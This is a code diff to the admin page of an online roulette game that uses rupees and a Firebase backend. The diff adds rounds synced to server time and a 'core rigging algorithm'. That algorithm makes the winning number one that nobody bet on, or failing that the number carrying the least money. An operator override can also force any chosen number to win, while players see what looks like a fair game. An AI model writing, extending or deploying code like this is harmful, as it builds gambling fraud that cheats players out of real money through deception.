@@ -4,19 +4,22 @@
     <meta charset="UTF-8">
     <title>Master Admin | Roulette Controller</title>
     <style>
-        body { background: #111; color: #fff; font-family: sans-serif; text-align: center; }
-        .grid { display: grid; grid-template-columns: repeat(6, 1fr); gap: 10px; padding: 20px; }
-        .card { background: #222; padding: 10px; border-radius: 5px; border-bottom: 3px solid #444; }
+        body { background: #111; color: #fff; font-family: sans-serif; text-align: center; margin: 0; padding: 20px; }
+        .grid { display: grid; grid-template-columns: repeat(6, 1fr); gap: 10px; padding: 20px; max-width: 900px; margin: auto; }
+        @media (max-width: 600px) { .grid { grid-template-columns: repeat(3, 1fr); } }
+        .card { background: #222; padding: 10px; border-radius: 5px; border-bottom: 3px solid #444; font-size: 14px; }
         .win { color: #22c55e; font-weight: bold; }
         .loss { color: #ef4444; font-weight: bold; }
-        button { background: #fbbf24; border: none; padding: 5px 10px; cursor: pointer; font-weight: bold; margin-top: 5px; width: 100%; }
-        #timer { font-size: 50px; color: #fbbf24; }
+        button { background: #fbbf24; border: none; padding: 6px 10px; cursor: pointer; font-weight: bold; margin-top: 5px; width: 100%; border-radius: 4px; transition: 0.1s; }
+        button:active { transform: scale(0.95); }
+        #timer { font-size: 50px; color: #fbbf24; font-weight: 900; margin: 10px 0; }
+        #mode-status { color: #ef4444; font-weight: 900; letter-spacing: 1px; text-transform: uppercase; }
     </style>
 </head>
 <body>
     <h1>ROULETTE LOSS-CONTROL</h1>
-    <div id="timer">45s</div>
-    <p id="mode-status" style="color: #ef4444; font-weight: 900;">MODE: AUTO-RIGGING (90% LOSS)</p>
+    <div id="timer">60s</div>
+    <p id="mode-status">MODE: AUTO-RIGGING (90% LOSS)</p>
 
     <div class="grid" id="admGrid"></div>
 
@@ -28,63 +31,146 @@
     const app = initializeApp(firebaseConfig);
     const db = getDatabase(app);
 
-    let timer = 45, state = "BETTING", forceRes = null, currentBets = {};
+    let state = "BETTING", forceRes = null, currentBets = {};
+    let localCurrentPeriod = 0, adminProcessed = false;
 
-    set(ref(db, "roulette_live"), { time: 45, state: "BETTING", result: 0, totalBets: {} });
+    // Connect to global distributed master clock sync offset
+    onValue(ref(db, ".info/serverTimeOffset"), offsetSnap => {
+        const offset = offsetSnap.val() || 0;
+        
+        setInterval(() => {
+            const serverTime = Date.now() + offset;
+            const totalSeconds = Math.floor(serverTime / 1000);
+            const secondInMinute = totalSeconds % 60;
+            const periodId = Math.floor(totalSeconds / 60);
 
-    setInterval(() => {
-        timer--;
-        if(timer <= 0) {
-            if(state === "BETTING") {
-                state = "RESULT"; timer = 10;
-                let finalRes = calculateRiggedResult();
-                update(ref(db, "roulette_live"), { state: "RESULT", result: finalRes });
-            } else {
-                state = "BETTING"; timer = 45;
-                update(ref(db, "roulette_live"), { state: "BETTING", time: 45, totalBets: {} });
+            const timerEl = document.getElementById("timer");
+            const modeEl = document.getElementById("mode-status");
+
+            if (localCurrentPeriod !== periodId) {
+                localCurrentPeriod = periodId;
+                adminProcessed = false;
+                resetBets();
             }
-        }
-        update(ref(db, "roulette_live"), { time: timer, state: state });
-        document.getElementById("timer").innerText = timer + "s";
-    }, 1000);
+
+            if (secondInMinute < 50) {
+                // Shared Real-time Betting Window (User Side active)
+                state = "BETTING";
+                let clockCountdown = 50 - secondInMinute;
+                timerEl.innerText = clockCountdown + "s";
+                timerEl.style.color = "#fbbf24";
+                modeEl.innerText = "PHASE: USER BETTING OPEN (PERIOD: " + periodId + ")";
+                modeEl.style.color = "#38bdf8";
+            } else {
+                // Shared Lockout & Forced Spin Window (Last 10 Seconds)
+                state = "RESULT";
+                let spinCountdown = 60 - secondInMinute;
+                timerEl.innerText = spinCountdown + "s";
+                timerEl.style.color = "#ef4444";
+                modeEl.innerText = "PHASE: SYSTEM CLOSED - RIGGING CALCULATION";
+                modeEl.style.color = "#ef4444";
+
+                if (!adminProcessed) {
+                    adminProcessed = true;
+                    processMatch(periodId);
+                }
+            }
+        }, 1000);
+    });
+
+    async function processMatch(periodId) {
+        // Compute best rigged number based on active matrix
+        let finalRes = calculateRiggedResult();
+
+        // Push calculation vectors directly into shared history nodes
+        await set(ref(db, `roulette_history/${periodId}`), {
+            period: periodId,
+            result: finalRes,
+            timestamp: Date.now()
+        });
+
+        // Notify client side nodes instantly to kickstart active dynamic rotations
+        await update(ref(db, "roulette_live"), { 
+            state: "RESULT", 
+            result: finalRes,
+            time: 10
+        });
+
+        // Clear manual override switches for next cycle rotation
+        forceRes = null;
+        document.getElementById("mode-status").innerText = "MODE: AUTO-RIGGING (90% LOSS)";
+    }
 
     function calculateRiggedResult() {
+        // If administrator injected manual selection via control board
         if(forceRes !== null) return forceRes;
 
-        // --- RIGGING LOGIC ---
+        // --- CORE RIGGING ALGORITHM ---
         let possibleNumbers = [];
         for(let i=0; i<=36; i++) {
-            // Sirf wo numbers jaha ₹0 bet lagi hai
-            if(!currentBets[i] || currentBets[i].amt === 0) {
+            // Check for segments containing clean absolute zero investments
+            let amt = currentBets[i]?.amt || 0;
+            if(amt === 0) {
                 possibleNumbers.push(i);
             }
         }
 
-        // Agar koi aisa number hai jisme bet nahi hai, toh wahi jitega (100% User Loss)
+        // If dead zones detected, force selection there (100% house profit edge)
         if(possibleNumbers.length > 0) {
             return possibleNumbers[Math.floor(Math.random() * possibleNumbers.length)];
         }
 
-        // Agar sab numbers par bet hai, toh jaha SABSE KAM paisa laga hai wo jitega
+        // If users covered full layout, trace global minimal liability path
         let minAmt = Infinity;
         let bestNum = 0;
         for(let i=0; i<=36; i++) {
             let amt = currentBets[i]?.amt || 0;
-            if(amt < minAmt) { minAmt = amt; bestNum = i; }
+            if(amt < minAmt) { 
+                minAmt = amt; 
+                bestNum = i; 
+            }
         }
         return bestNum;
     }
 
-    onValue(ref(db, "roulette_live/totalBets"), s => {
-        currentBets = s.val() || {};
-        const g = document.getElementById("admGrid"); g.innerHTML = "";
+    function resetBets() {
+        currentBets = {};
+        renderAdminGrid();
+        update(ref(db, "roulette_live"), { 
+            totalBets: {}, 
+            state: "BETTING",
+            time: 50
+        });
+    }
+
+    // Dynamic grid template building pipeline
+    function renderAdminGrid() {
+        const g = document.getElementById("admGrid"); 
+        g.innerHTML = "";
         for(let i=0; i<=36; i++){
             let a = currentBets[i]?.amt || 0;
-            g.innerHTML += `<div class="card">N${i}<br><span class="${a>0?'loss':'win'}">₹${a}</span><button onclick="setW(${i})">WIN</button></div>`;
+            g.innerHTML += `
+                <div class="card">
+                    <b>Num ${i}</b><br>
+                    <span class="${a > 0 ? 'loss' : 'win'}">₹${a.toFixed(2)}</span>
+                    <button onclick="setW(${i})">WIN</button>
+                </div>`;
         }
+    }
+
+    // Live update parser mapping real-time payload mutations from client transactions
+    onValue(ref(db, "roulette_live/totalBets"), s => {
+        currentBets = s.val() || {};
+        renderAdminGrid();
     });
 
-    window.setW = (n) => { forceRes = n; alert("Next Win: "+n); };
+    // Global click handler to execute targeted manual victory operations
+    window.setW = (n) => { 
+        forceRes = n; 
+        alert("FORCED OVERRIDE ACTIVE: Number " + n + " will win this round!"); 
+        document.getElementById("mode-status").innerText = "MANUAL WIN INJECTED FOR: NUMBER " + n;
+        document.getElementById("mode-status").style.color = "#fbbf24";
+    };
 </script>
 </body>
 </html>
